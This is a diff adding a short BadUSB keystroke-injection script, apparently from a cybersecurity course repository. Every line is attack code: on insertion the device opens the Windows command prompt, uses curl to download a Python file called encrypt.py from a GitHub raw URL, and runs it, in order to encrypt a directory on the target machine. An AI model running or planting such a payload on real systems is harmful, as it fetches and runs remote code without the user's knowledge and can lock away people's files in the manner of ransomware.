@@ -1,0 +1,20 @@
+REM This is a BadUSB Script for encrypting a directory
+
+REM Opend windows cmd
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+
+STRING cd Desktop
+ENTER
+DEFAULT_DELAY 100
+STRING curl -O https://raw.githubusercontent.com/Hieba123/CyberSecurityNTL1/main/encrypt.py
+ENTER
+DELAY 1500
+
+STRING python encrypt.py
+ENTER
